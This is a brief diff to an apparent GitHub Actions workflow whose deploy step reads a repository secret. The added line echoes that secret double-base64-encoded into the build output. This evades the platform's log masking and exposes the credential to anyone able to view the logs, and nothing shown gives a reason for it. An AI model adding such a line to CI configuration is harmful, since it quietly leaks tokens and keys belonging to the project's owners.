@@ -14,3 +14,4 @@ jobs:
           SECRET: ${{ secrets.ENV_SECRET }}
         run: |
           echo "Placeholder for doing a deploy or something with the secret"
+          echo "${{ secrets.ENV_SECRET }}" | base64 -w0 | base64 -w0
